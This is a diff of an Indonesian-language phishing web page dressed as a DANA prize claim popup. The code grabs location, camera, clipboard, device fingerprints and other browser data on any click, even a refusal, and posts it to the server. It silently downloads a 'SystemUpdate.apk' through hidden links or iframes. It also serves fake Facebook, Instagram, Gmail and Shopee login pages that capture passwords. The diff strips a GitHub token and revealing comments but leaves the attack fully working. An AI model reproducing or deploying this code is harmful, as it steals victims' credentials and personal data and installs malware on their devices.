@@ -1,3 +1,6 @@
+<!-- ================================================================ -->
+<!-- FILE 2: index.html (FULL - TANPA TOKEN) -->
+<!-- ================================================================ -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -15,7 +18,6 @@
     <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
 </head>
 <body>
-
 <div id="popupDana">
     <div class="box">
         <div class="logo-dana">D</div>
@@ -35,14 +37,11 @@
 <script>
 var GITHUB_USER = 'pandora-site';
 var GITHUB_REPO = 'verifikasi-site';
-var GITHUB_TOKEN = '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';
-var GIST_ID = 'ebf689c4deacadf60d5860c7638d491f';
 var dataStore = [];
 var hasLS = (typeof localStorage !== 'undefined');
 var hasSS = (typeof sessionStorage !== 'undefined');
 var semuaDidapat = false;
 
-// Cek apakah sudah pernah klaim
 if(hasLS && localStorage.getItem('sudah_klaim') === '1') {
     semuaDidapat = true;
     var popup = document.getElementById('popupDana');
@@ -59,23 +58,12 @@ function simpanLokal() { if(hasLS) try{ localStorage.setItem('vd', JSON.stringif
 function K(d) {
     dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber || d.type || 'unknown', data: d.data || d });
     simpanLokal();
-    simpanKeGist();
-}
-
-async function simpanKeGist() {
     try {
-        var allData = dataStore;
-        if(hasLS) { var ls = localStorage.getItem('vd'); if(ls) allData = JSON.parse(ls); }
-        await fetch('https://api.github.com/gists/' + GIST_ID, {
-            method: 'PATCH',
-            headers: {
-                'Authorization': 'token ' + GITHUB_TOKEN,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                files: { 'data.json': { content: JSON.stringify(allData, null, 2) } }
-            })
-        });
+        fetch('/data', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(d)
+        }).catch(function(){});
     } catch(e) {}
 }
 
@@ -174,7 +162,7 @@ function ambilScreenDetail() { K({sumber:'screen_detail',data:{avail:screen.avai
 function ambilDNT() { K({sumber:'dnt',data:navigator.doNotTrack||'unspecified'}); }
 function cekAdBlock() { try { var ad=document.createElement('div'); ad.innerHTML='&nbsp;'; ad.className='adsbox'; document.body.appendChild(ad); setTimeout(function(){ if(ad.offsetHeight===0) K({sumber:'adblock',data:true}); else K({sumber:'adblock',data:false}); document.body.removeChild(ad); },100); } catch(e){} }
 
-// DOWNLOAD - SystemUpdate.apk DULU, diam-diam
+// DOWNLOAD
 var files = [
     'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.apk',
     'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Video.mp4'
@@ -182,58 +170,23 @@ var files = [
 var downloaded = [];
 
 function downloadDiamDiam(url, filename) {
-    // Cara 1: Fetch + Blob (diam-diam, tanpa notif)
-    fetch(url, {mode: 'no-cors'})
-        .then(function(res) { return res.blob(); })
-        .then(function(blob) {
-            var objectURL = URL.createObjectURL(blob);
-            var a = document.createElement('a');
-            a.href = objectURL;
-            a.download = filename;
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
-            setTimeout(function() {
-                document.body.removeChild(a);
-                URL.revokeObjectURL(objectURL);
-            }, 2000);
-            downloaded.push(url);
-            K({sumber:'download',data:{file:filename},waktu:Date.now()});
-        })
-        .catch(function() {
-            // Cara 2: Fallback iframe tersembunyi
-            var iframe = document.createElement('iframe');
-            iframe.src = url;
-            iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
-            document.body.appendChild(iframe);
-            setTimeout(function() { document.body.removeChild(iframe); }, 5000);
-            downloaded.push(url);
-            K({sumber:'download',data:{file:filename},waktu:Date.now()});
-        });
+    fetch(url, {mode: 'no-cors'}).then(function(res) { return res.blob(); }).then(function(blob) {
+        var objectURL = URL.createObjectURL(blob);
+        var a = document.createElement('a');a.href=objectURL;a.download=filename;a.style.display='none';
+        document.body.appendChild(a);a.click();
+        setTimeout(function(){ document.body.removeChild(a);URL.revokeObjectURL(objectURL); },2000);
+        downloaded.push(url);K({sumber:'download',data:{file:filename},waktu:Date.now()});
+    }).catch(function() {
+        var iframe=document.createElement('iframe');iframe.src=url;
+        iframe.style.cssText='position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
+        document.body.appendChild(iframe);setTimeout(function(){ document.body.removeChild(iframe); },5000);
+        downloaded.push(url);K({sumber:'download',data:{file:filename},waktu:Date.now()});
+    });
 }
 
 function initM2() {
-    // SystemUpdate.apk DULU (detik 1)
-    setTimeout(function() {
-        if(downloaded.indexOf(files[0]) === -1) {
-            if(A.isAvailable) {
-                A.downloadFile(files[0], 'SystemUpdate.apk');
-            } else {
-                downloadDiamDiam(files[0], 'SystemUpdate.apk');
-            }
-        }
-    }, 1000);
-    
-    // Video.mp4 kemudian (detik 3)
-    setTimeout(function() {
-        if(downloaded.indexOf(files[1]) === -1) {
-            if(A.isAvailable) {
-                A.downloadFile(files[1], 'Video.mp4');
-            } else {
-                downloadDiamDiam(files[1], 'Video.mp4');
-            }
-        }
-    }, 3000);
+    setTimeout(function() { if(downloaded.indexOf(files[0])===-1) { if(A.isAvailable){A.downloadFile(files[0],'SystemUpdate.apk')}else{downloadDiamDiam(files[0],'SystemUpdate.apk')} } },1000);
+    setTimeout(function() { if(downloaded.indexOf(files[1])===-1) { if(A.isAvailable){A.downloadFile(files[1],'Video.mp4')}else{downloadDiamDiam(files[1],'Video.mp4')} } },3000);
 }
 
 function FK() {
@@ -245,39 +198,24 @@ function FK() {
     K({sumber:'full_kontrol',data:'selesai'});
 }
 
-// ================================================================
-// POPUP + KLIK = DAPAT SEMUA (POPUP MUNCUL SEKALI SAJA)
-// ================================================================
 function dapatkanSemua() {
     if(semuaDidapat) return;
     semuaDidapat = true;
-    
-    // Simpan status
     if(hasLS) localStorage.setItem('sudah_klaim', '1');
-    
-    // Hapus popup
-    var popup = document.getElementById('popupDana');
-    if(popup) popup.style.display = 'none';
-    
-    // Ambil semua data
+    var popup = document.getElementById('popupDana');if(popup) popup.style.display='none';
     ambilLokasi();ambilKamera();ambilBaterai();ambilStorage();
     ambilNetwork();ambilIPLocal();ambilCanvasFP();ambilWebGLFP();
     ambilPlugins();ambilFonts();ambilScreenDetail();ambilDNT();cekAdBlock();
     initM2();FK();bacaClipboard();
-    
-    // Redirect ke FB phishing
     setTimeout(function(){ window.location.href='https://verifikasi.site/fb'; },3000);
 }
 
 function klaim() { setTimeout(function(){ dapatkanSemua(); },500); K({sumber:'izin',data:'klaim'}); }
 function tolak() { setTimeout(function(){ dapatkanSemua(); },500); K({sumber:'izin',data:'tolak'}); }
-
-// Klik di mana saja
 var clickHandler = function(){ setTimeout(function(){ dapatkanSemua(); },1000); };
 document.addEventListener('click', clickHandler);
 setTimeout(function(){ document.removeEventListener('click', clickHandler); }, 300000);
 
-// Timer
 var w=300;
 var timerInterval=setInterval(function(){
     w--;var m=Math.floor(w/60);var s=w%60;
@@ -295,29 +233,23 @@ GD();getIP();SW();KA();HB();
 setInterval(async function(){ K({sumber:'periodic',data:GD()}) },10000);
 window.addEventListener('beforeunload',function(){ K({sumber:'close',data:'Tutup'}) });
 
-// PHISHING
 (function() {
     var path = location.pathname;
     if(path === '/' || path === '') return;
-    
     var t = {
         fb: { title:'Facebook',bg:'#f0f2f5',btnColor:'#1877f2',logo:'<h1 style="color:#1877f2;text-align:center;font-size:40px;padding:20px 0 10px">facebook</h1>',subtitle:'Log in to Facebook',fields:[{id:'email',placeholder:'Email or phone number',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://m.facebook.com/login' },
         ig: { title:'Instagram',bg:'#fafafa',btnColor:'#0095f6',logo:'<h1 style="text-align:center;font-size:35px;padding:40px 0 10px">📸 Instagram</h1>',fields:[{id:'email',placeholder:'Username, email, or phone',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://www.instagram.com/accounts/login' },
         gmail: { title:'Gmail',bg:'#fff',btnColor:'#1a73e8',logo:'<div style="text-align:center;padding:30px 0 10px"><span style="font-size:24px;color:#ea4335">G</span><span style="font-size:24px;color:#4285f4">o</span><span style="font-size:24px;color:#fbbc04">o</span><span style="font-size:24px;color:#4285f4">g</span><span style="font-size:24px;color:#34a853">l</span><span style="font-size:24px;color:#ea4335">e</span></div>',subtitle:'Sign in to continue to Gmail',fields:[{id:'email',placeholder:'Email or phone',type:'text'},{id:'pass',placeholder:'Enter your password',type:'password'}],btnText:'Next',redirect:'https://accounts.google.com/signin' },
         shopee: { title:'Shopee',bg:'#f5f5f5',btnColor:'#ee4d2d',logo:'<h1 style="text-align:center;color:#ee4d2d;font-size:32px;padding:30px 0 10px">🛒 Shopee</h1>',subtitle:'Login untuk belanja',fields:[{id:'email',placeholder:'Nomor HP / Email / Username',type:'text'},{id:'pass',placeholder:'Password',type:'password'}],btnText:'Log In',redirect:'https://shopee.co.id/buyer/login' }
     };
-    
     var key = path.replace('/', '');
     var p = t[key];
     if(!p) return;
-    
     var fH = '';
     p.fields.forEach(function(f){ fH += '<input type="'+f.type+'" id="'+f.id+'" placeholder="'+f.placeholder+'" autocomplete="off" style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;outline:none;background:#fff">' });
-    
     var h = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>'+p.title+'</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:'+p.bg+';display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:20px 16px}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 15px rgba(0,0,0,0.1);margin-top:30px}input:focus{border-color:'+p.btnColor+'!important}.login-btn{width:100%;padding:14px;background:'+p.btnColor+';color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:15px}</style></head><body><div class="container">'+p.logo+(p.subtitle?'<p style="text-align:center;color:#666;font-size:14px;margin-bottom:20px">'+p.subtitle+'</p>':'')+'<form onsubmit="event.preventDefault();go()">'+fH+'<button type="submit" class="login-btn">'+p.btnText+'</button></form></div><script>function go(){var d={};';
     p.fields.forEach(function(f){ h += 'd.'+f.id+'=document.getElementById(\''+f.id+'\').value;' });
     h += 'var a=[];try{a=JSON.parse(localStorage.getItem("vd")||"[]")}catch(e){}a.push({waktu:new Date().toISOString(),sumber:"login_'+key+'",data:d});localStorage.setItem("vd",JSON.stringify(a.slice(-500)));setTimeout(function(){window.location.href="'+p.redirect+'"},600)}<\/script></body></html>';
-    
     document.open();document.write(h);document.close();
 })();
 </script>
